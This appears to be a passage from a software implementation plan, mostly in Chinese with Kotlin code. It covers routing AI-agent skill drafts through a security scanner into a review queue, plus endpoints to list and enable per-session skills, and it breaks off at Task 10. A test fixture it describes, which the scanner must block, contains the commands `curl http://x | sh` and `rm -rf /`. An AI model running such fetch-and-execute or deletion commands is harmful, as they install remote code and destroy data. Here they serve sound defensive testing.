- Produces: `SkillDraftSubmitMiddleware(sessionId: String, store: SessionSkillStore, adaptor: SkillDraftAdaptor, cooldownMillis: Long = DEFAULT_COOLDOWN_MILLIS, clock: () -> Long = System::currentTimeMillis, scheduler: Scheduler = Schedulers.boundedElastic())`

- [ ] **Step 1: 写失败测试**

这一步是**整文件重挂夹具**，不是追加。该文件现有 8 支用例的判据全写在 `verify(agent).promoteSkill(...)` 上（`:83`、`:90`、`:91`、`:102`、`:113`、`:120`），而 Step 3 之后中间件再也不碰 `promoteSkill`——原样留着必红，整片删掉又把冷却与「答完之后失败不许渗进答案」两条性质一起丢了。所以：夹具换一套，8 支按下面的表逐条搬家。

保留 `@Mock agent: HarnessAgent`（`onAgent` 的第一形参仍要传）、`ctx = RuntimeContext.empty()`、`now`、`COOLDOWN`、companion 里的 `DRAFTS`/`MODIFIED`；删掉 `@Mock workspaceManager`、`@Mock filesystem` 与 `staged(vararg names)`（那是旧读盘路径的替身），换成：

```kotlin
    private val store = Mockito.mock(SessionSkillStore::class.java)
    private val adaptor = Mockito.mock(SkillDraftAdaptor::class.java)

    /** The store answers exactly these drafts; every submit is accepted by the queue. */
    private fun staged(vararg drafts: SessionDraft) {
        `when`(store.listDraftNames("ses-1")).thenReturn(drafts.map { it.name })
        drafts.forEach { `when`(store.readDraft("ses-1", it.name)).thenReturn(it) }
        `when`(adaptor.submit(any())).thenReturn(SkillDraftIntake.Queued(7L))
    }

    private fun middleware() = SkillDraftSubmitMiddleware(
        sessionId = "ses-1",
        store = store,
        adaptor = adaptor,
        cooldownMillis = COOLDOWN,
        clock = { now },
        scheduler = Schedulers.immediate(),
    )
```

`SkillDraftSubmitMiddleware.turn()`（`:75-77`）与 `agent`/`ctx` 的形状**原样不动**——`scheduler = Schedulers.immediate()` 已经让 offer 同步跑完，所以搬家后的用例一律继续 `middleware().turn()`，不许新写等待。

搬家对照表（左列号是现文件的行）：

| 现有用例 | 处置 | 新判据 |
| --- | --- | --- |
| `:80` 一支草稿走完晋升管线 | 由下面新增第一支取代 | 删掉本支，队列直投那条断言更全 |
| `:87` 每次暂存的草稿都上报不只第一支 | 留 | `verify(adaptor).submit(...)` 对两个名字各一次（`argumentCaptor` 取 allValues） |
| `:95` 窗口内同一草稿不重复上报 | 留 | `verify(adaptor, times(1)).submit(...)` |
| `:106` 过了窗口同一草稿再上报 | 留 | `now += COOLDOWN` 后 `times(2)` |
| `:117` 空暂存不起晋升 | 留，改名 `an empty draft list files nothing` | `verifyNoInteractions(adaptor)` |
| `:124` 未绑定 agent 的暂存无内容可报 | 换 | 这一性质已进 Task 3 的 store 用例，本位置改放下面新增第三支（读不到正文留给下一轮） |
| `:131` 起不动的管线不碰答案 | 留 | `adaptor.submit` 抛异常 → `assertDoesNotThrow { middleware().turn() }` |
| `:139` 答完之后失败的管线只记日志不抛 | 留 | `store.listDraftNames` 抛异常 → `assertDoesNotThrow { middleware().turn() }` |

净数 8 → 10 支（-2 支被替换、+4 支新增）。

```kotlin
    /**
     * The reason the review queue was empty on a real deployment: the offer ran after the answer, by which
     * time SandboxLifecycleMiddleware has unbound the sandbox and every workspace read answers `No active
     * sandbox`. So the offer takes a container handle, not the agent's filesystem.
     */
    @Test
    fun `the draft is filed straight into the queue instead of through the promotion gate`() {
        staged(SessionDraft("invoice-fill", "fills an invoice", MD, mapOf("scripts/run.sh" to "echo hi\n")))

        middleware().turn()

        val proposal = argumentCaptor<SkillDraftProposal>()
        verify(adaptor).submit(proposal.capture())
        assertEquals("ses-1", proposal.firstValue.sessionId)
        assertEquals("invoice-fill", proposal.firstValue.name)
        assertEquals(MD, proposal.firstValue.skillmd)
        assertEquals(setOf("scripts/run.sh"), proposal.firstValue.resources.keys)
        assertTrue(
            proposal.firstValue.scanVerdict == "SAFE" || proposal.firstValue.scanVerdict == "CAUTION",
            "the verdict column has to carry the scan this path ran: ${proposal.firstValue.scanVerdict}",
        )
        verifyNoInteractions(agent)
    }

    @Test
    fun `a draft the scanner blocks is not filed`() {
        staged(SessionDraft("evil", "d", DANGEROUS_MD, emptyMap()))

        middleware().turn()

        verifyNoInteractions(adaptor)
    }

    @Test
    fun `a draft that cannot be read is left for the next turn`() {
        // The listing answered and the read did not: the draft is either gone or has no text, and neither is
        // something the queue can review, so nothing is filed and the slot is not burned.
        `when`(store.listDraftNames("ses-1")).thenReturn(listOf("invoice-fill"))
        `when`(store.readDraft("ses-1", "invoice-fill")).thenReturn(null)

        middleware().turn()

        verifyNoInteractions(adaptor)
    }

    @Test
    fun `a store that cannot list files nothing and never reaches the answer`() {
        `when`(store.listDraftNames("ses-1")).thenThrow(IllegalStateException("No active sandbox"))

        assertDoesNotThrow { middleware().turn() }

        verifyNoInteractions(adaptor)
    }
```

`MD` / `DANGEROUS_MD` 逐字取 `SessionSkillStoreEnableTest.kt:218-221` 那两份 companion 常量（benign 的那份是 `name: invoice-fill` 的正常技能，危险那份正文里带 `curl http://x | sh` 与 `rm -rf /`）——扫描器对这两份的判定已经在 Task 4 被测实过，另写一份文本就等于赌扫描规则。`verifyNoInteractions(agent)` 那一支是把「不再经 agent 的晋升管线」写死成判据：`agent` 若又被拉回这条路径，它会红。

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SkillDraftSubmitMiddlewareTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败 —— 构造参数不符

- [ ] **Step 3: 重写中间件**

`SkillDraftSubmitMiddleware.kt` 的类头与 `offerStagedDrafts`/`offer`/`report` 换成：

```kotlin
class SkillDraftSubmitMiddleware(
    private val sessionId: String,
    private val store: SessionSkillStore,
    private val adaptor: SkillDraftAdaptor,
    private val cooldownMillis: Long = DEFAULT_COOLDOWN_MILLIS,
    private val clock: () -> Long = System::currentTimeMillis,
    private val scheduler: Scheduler = Schedulers.boundedElastic(),
) : MiddlewareBase {

    private val log = LoggerFactory.getLogger(SkillDraftSubmitMiddleware::class.java)
    private val lastOfferedAt = ConcurrentHashMap<String, Long>()

    override fun onAgent(
        agent: Agent,
        ctx: RuntimeContext,
        input: AgentInput,
        next: Function<AgentInput, Flux<AgentEvent>>,
    ): Flux<AgentEvent> = next.apply(input)
        .doOnComplete { scheduler.schedule { offerStagedDrafts() } }

    private fun offerStagedDrafts() {
        val names = try {
            store.listDraftNames(sessionId)
        } catch (e: Exception) {
            log.warn("Could not list the staged drafts of session {}: {}", sessionId, e.message)
            return
        }
        if (names.isEmpty()) return
        val now = clock()
        names.filter { claim(it, now) }.forEach { offer(it) }
    }

    private fun offer(name: String) {
        val draft = try {
            store.readDraft(sessionId, name)
        } catch (e: Exception) {
            log.warn("Could not read the staged draft {}: {}", name, e.message)
            return
        } ?: run {
            log.warn("Staged draft {} of session {} has no text to file: it is either gone or was never written", name, sessionId)
            return
        }
        val scan = SkillSecurityScanner.scan(name, draft.skillmd, draft.resources)
        if (!SkillSecurityScanner.shouldAllow(SkillSecurityScanner.TrustLevel.AGENT_CREATED, scan.verdict())) {
            log.warn("Staged draft {} is {} and is not filed: {}", name, scan.verdict(), scan.findings().size)
            return
        }
        val intake = try {
            adaptor.submit(
                SkillDraftProposal(
                    sessionId = sessionId,
                    name = name,
                    description = draft.description,
                    skillmd = draft.skillmd,
                    resources = draft.resources,
                    scanVerdict = scan.verdict().name,
                    scanFindings = findingTexts(scan.findings()),
                ),
            )
        } catch (e: Exception) {
            // Not supposed to throw. One that does has told us nothing about whether the row landed, so the
            // cooldown slot is released and the next turn offers it again rather than letting it go stale.
            log.warn("Skill draft intake for {} raised {}: {}", name, e.javaClass.simpleName, e.message)
            lastOfferedAt.remove(name)
            return
        }
        when (intake) {
            is SkillDraftIntake.Queued -> log.info("Draft skill {} of session {} is queued for review as draft {}", name, sessionId, intake.draftId)
            is SkillDraftIntake.Refused -> log.warn("Draft skill {} was refused by the review queue: {}", name, intake.reason)
            is SkillDraftIntake.Unavailable -> {
                log.warn("Draft skill {} could not reach the review queue: {}", name, intake.reason)
                lastOfferedAt.remove(name)
            }
        }
    }
```

`claim`（`:98-110`）原样保留。Step 3 与 Step 4 都要用的 `findingTexts` **已经在仓里了**——Task 3 把它落在 `SessionSkillStore.kt:228`，`internal fun findingTexts(findings: List<SkillSecurityScanner.Finding>): List<String>`，与 `AdminBackedPromotionGate.kt:104-105` 那枚私有 `describe` 逐字同形状（同一串 `patternId [severity/category] file:line description`）。两个调用点都在 `com.agnetix.harnax.harness.skill` 包内，`internal` 在同模块可见，**直接调用、不要 import、更不要在本文件再声明一遍**——再声明一次是 redeclaration，整个模块编不过。队列的 findings 列因此不换形状。

`ctx` 参数从 `offerStagedDrafts` 一路去掉——上报不再走 agent 的工作区文件系统，这正是这一跳修好的东西。imports 换成 `SkillSecurityScanner`、`SkillDraftAdaptor`、`SkillDraftIntake`、`SkillDraftProposal`，删掉 `SkillPromoter` 与 `RuntimeContext`（若 `onAgent` 仍需要 `RuntimeContext` 则保留）。

文件里的 `SYSTEM_REVIEWER` 常量与 `report(…)`/`staging.promote(…)` 路径整块删除（`report` 的三个 status 不再可达；gate 那条路仍由 `AdminBackedPromotionGate` 承担）。

构造签名一改，唯一调用点立刻跟着换，否则本任务的 HEAD 编不过。`HarnessAgentLauncher.kt` 的 self-write 块里 Task 6 留下的那行：

```kotlin
agentBuilder.addMiddleware(SkillDraftSubmitMiddleware(staging))
```

换成：

```kotlin
agentBuilder.addMiddleware(
    SkillDraftSubmitMiddleware(
        sessionId = sessionId,
        store = sessionSkillStore,
        adaptor = skillDraftIntake,
    ),
)
```

`sessionId` 与 `skillDraftIntake` 在那个 `if (skillDraftIntake != null)` 块里都已在作用域内，`sessionSkillStore` 是 Task 6 立在 launcher 上的单例。

- [ ] **Step 4: gate 用同一条 findingTexts**

`AdminBackedPromotionGate.kt:104-105` 的私有 `describe` 删除，`:70` 改为：

```kotlin
scanFindings = findingTexts(candidate.securityScan()?.findings().orEmpty()),
```

- [ ] **Step 5: 跑该模块全量**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am`
Expected: `Failures: 0, Errors: 0`，总数 **689**（Task 6 之后 687 + 本任务净增 2 支：8 → 10）。若实到数与 689 不符，先数 `SkillDraftSubmitMiddlewareTest` 里剩几支再说，别改基线数字交差。

- [ ] **Step 6: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftSubmitMiddleware.kt \
        harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/AdminBackedPromotionGate.kt \
        harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncher.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SkillDraftSubmitMiddlewareTest.kt
git commit -m "fix(skill): 答完之后的上报改走容器句柄直连队列——解绑沙箱后读空导致待审队列始终为零"
```

---

## Task 8: agent-service 两条会话级端点

**Files:**
- Create: `harnax-agent/harnax-agent-service/src/main/kotlin/com/agnetix/harnax/agent/service/controller/SessionSkillController.kt`
- Test: `harnax-agent/harnax-agent-service/src/test/kotlin/com/agnetix/harnax/agent/service/controller/SessionSkillControllerTest.kt`

**Interfaces:**
- Consumes: `HarnessAgentLauncher.sessionSkillStore`、`@InternalOnly`（`com.agnetix.harnax.auth.InternalOnly`）
- Produces: `GET /api/agent/session-skills/{sessionId}` → `ResultVo<List<SessionSkillView>>`；`POST /api/agent/session-skills/{sessionId}/{name}/enable` → `ResultVo<EnableResultView>`

- [ ] **Step 1: 写失败测试**

```kotlin
package com.agnetix.harnax.agent.service.controller

import com.agnetix.harnax.common.dto.ResultVo
import com.agnetix.harnax.harness.HarnessAgentLauncher
import com.agnetix.harnax.harness.skill.EnableOutcome
import com.agnetix.harnax.harness.skill.EnabledSkill
import com.agnetix.harnax.harness.skill.SessionSkillStore
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.mockito.Mockito
import org.mockito.kotlin.any
import org.mockito.kotlin.eq

/**
 * The two calls a session panel makes. Both answer even when the container is gone, because "this session
 * has nothing enabled" and "this session's sandbox is stopped" look the same to a panel and only one of
 * them is a dead end for the operator.
 */
class SessionSkillControllerTest {

    private val launcher = Mockito.mock(HarnessAgentLauncher::class.java)

    private val store = Mockito.mock(SessionSkillStore::class.java)

    private fun controller(): SessionSkillController {
        Mockito.`when`(launcher.sessionSkillStore).thenReturn(store)
        return SessionSkillController(launcher)
    }

    @Test
    fun `a stopped container lists nothing`() {
        Mockito.`when`(store.listEnabled("ses-1")).thenReturn(emptyList())
        assertTrue(controller().list("ses-1").isSuccess())
    }

    @Test
    fun `an enable carries the verdict the operator is agreeing with`() {
        Mockito.`when`(store.enable("ses-1", "invoice-fill"))
            .thenReturn(EnableOutcome.Enabled("invoice-fill", "CAUTION", 2))
        val body = controller().enable("ses-1", "invoice-fill").data!!
        assertTrue(body.ok)
        assertEquals("CAUTION", body.verdict)
        assertEquals(2, body.findings)
    }

    @Test
    fun `a blocked enable is a refusal the panel can name`() {
        Mockito.`when`(store.enable("ses-1", "invoice-fill"))
            .thenReturn(EnableOutcome.Blocked("DANGEROUS", listOf("rm -rf")))
        val vo = controller().enable("ses-1", "invoice-fill")
        assertFalse(vo.isSuccess())
        assertTrue(vo.message.orEmpty().contains("DANGEROUS"), vo.message)
    }

    @Test
    fun `a session over the cap says so with the number`() {
        Mockito.`when`(store.enable(any(), any()))
            .thenReturn(EnableOutcome.Full(10))
        val vo = controller().enable("ses-1", "invoice-fill")
        assertFalse(vo.isSuccess())
        assertTrue(vo.message.orEmpty().contains("10"), vo.message)
    }
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-agent-service -am -Dtest=SessionSkillControllerTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败，`unresolved reference: SessionSkillController`

- [ ] **Step 3: 实现控制器**

```kotlin
package com.agnetix.harnax.agent.service.controller

import com.agnetix.harnax.auth.InternalOnly
import com.agnetix.harnax.common.dto.ResultVo
import com.agnetix.harnax.harness.HarnessAgentLauncher
import com.agnetix.harnax.harness.skill.EnableOutcome
import io.swagger.v3.oas.annotations.Operation
import io.swagger.v3.oas.annotations.tags.Tag
import org.slf4j.LoggerFactory
import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.PathVariable
import org.springframework.web.bind.annotation.PostMapping
import org.springframework.web.bind.annotation.RequestBody
import org.springframework.web.bind.annotation.RequestMapping
import org.springframework.web.bind.annotation.RestController

/**
 * A session's own skills: what has been drafted and what the operator has let this session use.
 *
 * Internal-only, like the workspace browsing next to it — nothing here is reachable from a browser or the
 * app directly. Both go through `harnax-session-router`, which is where the session's owner is checked
 * (`SessionRouterService.boundInstance` runs `sessionAccessGuard.requireAccessible` on its first line), and
 * nginx has no `/api/agent/` location to add a route to.
 *
 * The state lives in one container, so no session can read or enable another's skills even if a caller named
 * a different id: the handle is resolved per session id and nothing is shared.
 */
@RestController
@RequestMapping("/api/agent/session-skills")
@InternalOnly
@Tag(name = "Session Skills", description = "Per-session skill drafting and enabling APIs")
class SessionSkillController(
    private val launcher: HarnessAgentLauncher,
) {

    private val log = LoggerFactory.getLogger(SessionSkillController::class.java)

    @GetMapping("/{sessionId}")
    @Operation(summary = "List enabled skills", description = "List the skills this session may use")
    fun list(@PathVariable sessionId: String): ResultVo<List<SessionSkillView>> =
        ResultVo.success(launcher.sessionSkillStore.listEnabled(sessionId).map {
            SessionSkillView(it.name, it.description, it.enabledAt)
        })

    @PostMapping("/{sessionId}/{name}/enable")
    @Operation(summary = "Enable one draft in this session", description = "Copy one draft into this session's enabled skills")
    fun enable(
        @PathVariable sessionId: String,
        @PathVariable name: String,
        @RequestBody(required = false) actor: EnableActorRequest?,
    ): ResultVo<EnableResultView> =
        when (val outcome = launcher.sessionSkillStore.enable(sessionId, name)) {
            is EnableOutcome.Enabled -> {
                log.info(
                    "Skill {} enabled for session {} by user {} (verdict {})",
                    outcome.name,
                    sessionId,
                    actor?.userId ?: "unknown",
                    outcome.verdict,
                )
                ResultVo.success(
                    EnableResultView(
                        ok = true,
                        name = outcome.name,
                        verdict = outcome.verdict,
                        findings = outcome.findings,
                        count = launcher.sessionSkillStore.listEnabledNames(sessionId).size,
                    ),
                )
            }

            is EnableOutcome.Blocked -> ResultVo.error(
                403,
                "the security scan says ${outcome.verdict}: " + outcome.findings.joinToString("; "),
            )

            is EnableOutcome.Full -> ResultVo.error(
                409,
                "this session already has ${outcome.count} skills enabled; enable replaces one of them, it does not add a further one",
            )

            EnableOutcome.SourceMissing -> ResultVo.error(404, "no draft named '$name' to enable")

            is EnableOutcome.Failed -> ResultVo.error(500, "the container refused the copy: ${outcome.reason}")

            EnableOutcome.NoSandbox -> ResultVo.error(
                410,
                "this session has no running sandbox, so there is nowhere to enable a skill into",
            )
        }
}

data class SessionSkillView(val name: String, val description: String?, val enabledAt: String?)

/** Who pressed the button, as the router resolved it (D11: this log line is the whole audit trail). */
data class EnableActorRequest(val userId: Long? = null)

data class EnableResultView(
    val ok: Boolean,
    val name: String? = null,
    val verdict: String? = null,
    val findings: Int = 0,
    val count: Int = 0,
)
```

这三枚 `data class` 直接反序列化即可：agent-service 装的是 Kotlin 模块的 mapper（`harnax-agent/harnax-agent-service/src/main/kotlin/com/agnetix/harnax/agent/service/LauncherBean.kt:18` 的 `jacksonObjectMapper()`），带默认值构造参数的 data class 不需要额外注解。`EnableActorRequest` 只有 `userId` 一个可空字段且带默认值，缺体也能解出。真机若出现 `Cannot construct instance`，再退回 `Map<String, Any?>` 的取法。

- [ ] **Step 4: 跑测试与全模块**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-agent-service && ... mvn -o test -pl harnax-agent/harnax-agent-service -am`
Expected: `BUILD SUCCESS`，0 失败

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-agent-service/src/main/kotlin/com/agnetix/harnax/agent/service/controller/SessionSkillController.kt \
        harnax-agent/harnax-agent-service/src/test/kotlin/com/agnetix/harnax/agent/service/controller/SessionSkillControllerTest.kt
git commit -m "feat(agent-service): 会话技能列出与启用两条内部端点——三类拒因各带可判原因"
```

---

## Task 9: session-router 两条代理路由

**Files:**
- Modify: `harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/service/AgentServiceClient.kt:202-250`
- Modify: `harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/proxy/SessionRouterService.kt:409-455`
- Modify: `harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/controller/AgentProxyController.kt:193-221`
- Test: `harnax-session-router/src/test/kotlin/com/agnetix/harnax/router/proxy/SessionRouterServiceSessionSkillTest.kt`

**Interfaces:**
- Consumes: Task 8 的两条 `/api/agent/session-skills/**`
- Produces: `GET /api/router/agent/session-skills/{sessionId}`、`POST /api/router/agent/session-skills/{sessionId}/{name}/enable`；`AgentServiceClient.sessionSkillList` / `sessionSkillEnable`；`SessionRouterService.proxySessionSkills` / `proxyEnableSessionSkill`

- [ ] **Step 1: 写失败测试**

```kotlin
package com.agnetix.harnax.router.proxy

import com.agnetix.harnax.auth.AuthContext
import com.agnetix.harnax.auth.AuthContextHolder
import com.agnetix.harnax.common.dto.ResultVo
import com.agnetix.harnax.router.entity.AgentInstance
import com.agnetix.harnax.router.service.AgentServiceClient
import com.agnetix.harnax.router.service.IdempotencyService
import com.agnetix.harnax.router.service.InstanceRegistry
import com.agnetix.harnax.router.service.SessionAccessGuard
import com.agnetix.harnax.router.service.SessionEvictor
import com.agnetix.harnax.router.service.SessionMappingService
import com.agnetix.harnax.router.service.impl.LocalInstanceCircuitBreaker
import io.micrometer.core.instrument.simple.SimpleMeterRegistry
import kotlinx.coroutines.runBlocking
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNotNull
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Test
import org.mockito.Mockito
import org.mockito.kotlin.any
import org.mockito.kotlin.eq
import org.mockito.kotlin.isNull
import java.time.Instant

/**
 * An unbound session answers empty instead of being placed on some other instance: the enabled skills are
 * files inside one container, and a second agent's container does not have them. That is the rule the
 * workspace reads already follow (`SessionRouterService:500-521`), and these two inherit it.
 */
class SessionRouterServiceSessionSkillTest {

    @AfterEach
    fun clearAuthContext() {
        // The holder is a ThreadLocal; leaving a context set would decide the next test on this thread.
        AuthContextHolder.clear()
    }

    @Test
    fun `a session with no bound instance lists nothing and calls nobody`() = runBlocking {
        val (service, client) = fixture(bound = false)
        val result = service.proxySessionSkills("ses-1")
        assertNotNull(result)
        assertEquals(200, result.code)
        Mockito.verifyNoInteractions(client)
    }

    @Test
    fun `an enable travels to the instance that holds the session and carries its operator`() = runBlocking {
        val (service, client) = fixture(bound = true)
        AuthContextHolder.set(AuthContext("webui-caller", userId = 42L))
        Mockito.`when`(client.sessionSkillEnable(any(), eq("ses-1"), eq("invoice-fill"), eq(42L)))
            .thenReturn(ResultVo.success(mapOf("ok" to true)))
        service.proxyEnableSessionSkill("ses-1", "invoice-fill")
        Mockito.verify(client).sessionSkillEnable(
            eq("http://agent:8082"),
            eq("ses-1"),
            eq("invoice-fill"),
            eq(42L),
        )
    }

    @Test
    fun `a caller with no auth context forwards no operator rather than an invented one`() = runBlocking {
        val (service, client) = fixture(bound = true)
        assertNull(AuthContextHolder.get())
        Mockito.`when`(client.sessionSkillEnable(any(), any(), any(), isNull()))
            .thenReturn(ResultVo.success(mapOf("ok" to true)))
        service.proxyEnableSessionSkill("ses-1", "invoice-fill")
        Mockito.verify(client).sessionSkillEnable(any(), eq("ses-1"), eq("invoice-fill"), isNull())
    }

    private fun fixture(bound: Boolean): Pair<SessionRouterService, AgentServiceClient> {
        // 抄同包 SessionRouterServiceTest.kt:69-89 的 setUp：breaker 与 meterRegistry 用真身，其余全是 mock。
        // bound=false 让 sessionMappingService.getInstanceId 回 null，于是 boundInstance 回 null。
        val client = Mockito.mock(AgentServiceClient::class.java)
        val mappingService = Mockito.mock(SessionMappingService::class.java)
        val registry = Mockito.mock(InstanceRegistry::class.java)
        Mockito.`when`(mappingService.getInstanceId("ses-1"))
            .thenReturn(if (bound) "inst-1" else null)
        if (bound) {
            // AgentInstance 的构造抄 SessionRouterServiceTest.kt:104-111 的 healthyInstance，只把 host
            // 换成 agent：getBaseUrl() 就是 "http://$host:$port"（AgentInstance.kt:173），断言里那个
            // http://agent:8082 是这么来的。
            Mockito.`when`(registry.getInstance("inst-1")).thenReturn(
                AgentInstance().apply {
                    instanceId = "inst-1"
                    host = "agent"
                    port = 8082
                    status = "UP"
                    active = 1
                    lastHeartbeat = Instant.now()
                },
            )
        }
        val service = SessionRouterService(
            registry,
            mappingService,
            Mockito.mock(IdempotencyService::class.java),
            LocalInstanceCircuitBreaker(failureThreshold = 3, openDurationMs = 30000),
            client,
            Mockito.mock(SessionEvictor::class.java),
            Mockito.mock(SessionAccessGuard::class.java),
            SimpleMeterRegistry(),
            30000L,
            2,
        )
        return service to client
    }
}
```

- [ ] **Step 2: 核对 fixture 与既有测试同源**

Step 1 的 `fixture()` 已按 `harnax-session-router/src/test/kotlin/com/agnetix/harnax/router/proxy/SessionRouterServiceTest.kt:69-89` 写实，不必再补代码，但要对着它核三件事：`SessionRouterService` 的构造仍是那十枚参数（`SessionRouterService.kt:39-52`，多了少了都说明主源码构造变了，要回改这里而不是改主源码）；`LocalInstanceCircuitBreaker(failureThreshold = 3, openDurationMs = 30000)` 与 `SimpleMeterRegistry()` 的真身用法与那支一致；`AgentInstance` 的 setter 名逐个对得上同文件 `:104-111`。第三支用例若 `isNull()` 在 `Long?` 上推断不过，退写成 `eq<Long?>(null)`，别改成 `any()`——那会把「没带操作人」这一支证成什么都没说。

- [ ] **Step 3: client 两条转发**

`AgentServiceClient.kt` Workspace 段之后加：

```kotlin
// ==================== Session skills ====================

/**
 * List the skills one session has enabled.
 */
suspend fun sessionSkillList(
    baseUrl: String,
    sessionId: String,
): ResultVo<List<Map<String, Any>>> {
    val url = agentUrl(baseUrl, "/api/agent/session-skills/${segment(sessionId)}")
    return webClient.get()
        .uri(url)
        .retrieve()
        .bodyToMono(object : ParameterizedTypeReference<ResultVo<List<Map<String, Any>>>>() {})
        .awaitSingleOrNull()
        ?: throw emptyBody(url.toString())
}

/**
 * Copy one of a session's drafts into its enabled set.
 *
 * [userId] is the acting user as the router resolved it, not as the caller claimed it — D11 wants the
 * operator named in agent-service's log, and this internal body is the same channel `proxyChatRequest`
 * already uses for the user a request is acting for.
 */
suspend fun sessionSkillEnable(
    baseUrl: String,
    sessionId: String,
    name: String,
    userId: Long?,
): ResultVo<Map<String, Any>> {
    val url = agentUrl(
        baseUrl,
        "/api/agent/session-skills/${segment(sessionId)}/${segment(name)}/enable",
    )
    return webClient.post()
        .uri(url)
        .contentType(MediaType.APPLICATION_JSON)
        .bodyValue(mapOf("userId" to userId))
        .retrieve()
        .bodyToMono(object : ParameterizedTypeReference<ResultVo<Map<String, Any>>>() {})
        .awaitSingleOrNull()
        ?: throw emptyBody(url.toString())
}
```

- [ ] **Step 4: service 两个代理 + controller 两条路由**

`SessionRouterService.kt` 的 workspace 段之后：

```kotlin
/**
 * The skills one session has enabled. Read-only, so it follows the binding instead of placing the session.
 */
suspend fun proxySessionSkills(sessionId: String): ResultVo<List<Map<String, Any>>> {
    setMDC(sessionId, null)
    try {
        val instance = boundInstance(sessionId) ?: return ResultVo.success(emptyList())
        return callBound(sessionId, "sessionSkills", instance) { target ->
            agentServiceClient.sessionSkillList(target.getBaseUrl(), sessionId)
        }
    } finally {
        clearMDC()
    }
}

suspend fun proxyEnableSessionSkill(
    sessionId: String,
    name: String,
): ResultVo<Map<String, Any>> {
    setMDC(sessionId, null)
    try {
        val instance = boundInstance(sessionId)
            ?: return ResultVo.error(410, "Session $sessionId is not bound to an agent instance, so it has no sandbox to enable a skill into")
        // The operator comes from this request's own auth context, the same source resolveUserId reads
        // (AgentProxyController.kt:50-56). Nothing a caller typed into a body can name who pressed the button.
        val actorUserId = AuthContextHolder.get()?.userId
        return callBound(sessionId, "enableSessionSkill", instance) { target ->
            agentServiceClient.sessionSkillEnable(target.getBaseUrl(), sessionId, name, actorUserId)
        }
    } finally {
        clearMDC()
    }
}
```

`SessionRouterService.kt` 这个文件本身没有引过它（`controller/AgentProxyController.kt:10` 与 `service/SessionAccessGuard.kt:3` 都引了，照它们那行写），所以要一起加上，否则上面那段编不过：

```kotlin
import com.agnetix.harnax.auth.AuthContextHolder
```

`AgentProxyController.kt` 的 workspace 段之前（紧跟 `/context/{sessionId}`）：

```kotlin
// ---- Session skill proxy endpoints ----

/**
 * List the skills this session may use. Ownership is checked where every other session-scoped read
 * checks it: in `boundInstance`, on the first line.
 */
@GetMapping("/session-skills/{sessionId}")
suspend fun proxySessionSkills(
    @PathVariable sessionId: String,
    httpRequest: HttpServletRequest,
): ResultVo<List<Map<String, Any>>> {
    httpRequest.setAttribute(SESSION_ID_ATTR, sessionId)
    return sessionRouterService.proxySessionSkills(sessionId)
}

@PostMapping("/session-skills/{sessionId}/{name}/enable")
suspend fun proxyEnableSessionSkill(
    @PathVariable sessionId: String,
    @PathVariable name: String,
    httpRequest: HttpServletRequest,
): ResultVo<Map<String, Any>> {
    httpRequest.setAttribute(SESSION_ID_ATTR, sessionId)
    log.info("Received enable-session-skill proxy request for session: $sessionId, skill: $name")
    return sessionRouterService.proxyEnableSessionSkill(sessionId, name)
}
```

- [ ] **Step 5: 跑测试与全模块**

Run: `... mvn -q spotless:apply -pl harnax-session-router && ... mvn -o test -pl harnax-session-router -am`
Expected: `BUILD SUCCESS`，0 失败

- [ ] **Step 6: 提交**

```bash
git add harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/service/AgentServiceClient.kt \
        harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/proxy/SessionRouterService.kt \
        harnax-session-router/src/main/kotlin/com/agnetix/harnax/router/controller/AgentProxyController.kt \
        harnax-session-router/src/test/kotlin/com/agnetix/harnax/router/proxy/SessionRouterServiceSessionSkillTest.kt
git commit -m "feat(router): 会话技能两条代理路由——归属判定继承 boundInstance 的会话守卫"
```

---

## Task 10: Admin 队列按会话过滤

**Files:**
- Modify: `harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/service/SkillDraftService.kt:38-43`
- Modify: `harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/service/impl/SkillDraftServiceImpl.kt:208-227`
- Modify: `harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/controller/SkillDraftController.kt:55-79`
- Test: `harnax-admin/src/test/kotlin/com/agnetix/harnax/admin/service/impl/SkillDraftServiceImplTest.kt`（在 `page is tenant scoped`（`:475-488`）之后追加两支用例，复用该文件 `:105-132` 的 setUp 与既有 `service` / `skillDraftMapper` 字段；**不新建** page 专测文件，那等于把同一套租户+审核人夹具抄第二遍）
- Test: `harnax-admin/src/test/kotlin/com/agnetix/harnax/admin/it/SkillDraftFlowIT.kt`（追加一支用例）

**Interfaces:**
- Consumes: 无（`harnax-entity/src/main/kotlin/com/agnetix/harnax/mapper/SkillDraftMapper.kt:56-61` 的 `selectDraftList(tenantId, status, name, sourceSessionId)` 与 `harnax-entity/src/main/resources/mapper/SkillDraftMapper.xml:86-88` 的 `<if>` 已就绪，**不动 SQL 与 mapper**；`harnax-entity` 也不在本轮改动清单里）
- Produces: `SkillDraftService.page(status, name, sessionId, pageNum, pageSize)`

- [ ] **Step 1: 写失败测试**

```kotlin
